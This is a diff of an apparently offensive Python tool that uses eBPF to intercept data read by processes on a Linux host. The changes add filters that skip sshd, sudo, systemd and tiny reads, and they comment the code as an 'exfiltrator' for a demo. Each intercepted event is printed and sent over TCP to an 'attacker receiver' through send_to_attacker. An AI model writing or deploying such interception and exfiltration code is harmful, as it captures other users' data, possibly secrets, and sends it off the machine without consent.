@@ -158,29 +158,39 @@ def load_and_run():
 
     intercepted_count = 0
 
-    # Callback called every time eBPF submits an event to the ring buffer
     def handle_event(cpu, data, size):
         nonlocal intercepted_count
 
+        # Cast raw data pointer to our Event struct
         event = ctypes.cast(data, ctypes.POINTER(Event)).contents
 
-        # Skip our own process to avoid feedback loop
+        # Skip our own exfiltrator process to avoid feedback loop
         if event.pid == os.getpid():
             return
 
-        # Format the event
+        # Decode process name for filtering
+        comm_str = event.comm.decode('utf-8', errors='replace').strip('\x00')
+
+        # Skip noisy system processes that aren't useful for the demo
+        if comm_str in ('sshd', 'sudo', 'systemd', 'python3'):
+            return
+
+        # Skip tiny reads — usually internal kernel/lib noise, not real data
+        if event.bytes_read < 10:
+            return
+
+        # Format the intercepted event into a readable string
         formatted = format_event(
             event.pid,
             event.uid,
             event.comm,
             event.bytes_read,
-            bytes(event.data[:event.bytes_read if event.bytes_read < 256 else 256])
-        )
+            bytes(event.data[:event.bytes_read if event.bytes_read < 256 else 256]))
 
         intercepted_count += 1
         print(f"[INTERCEPT #{intercepted_count}] {formatted}")
 
-        # Exfiltrate to attacker
+        # Exfiltrate the formatted event over TCP to the attacker receiver
         send_to_attacker(formatted.encode('utf-8'))
 
     # Open the ring buffer and set callback
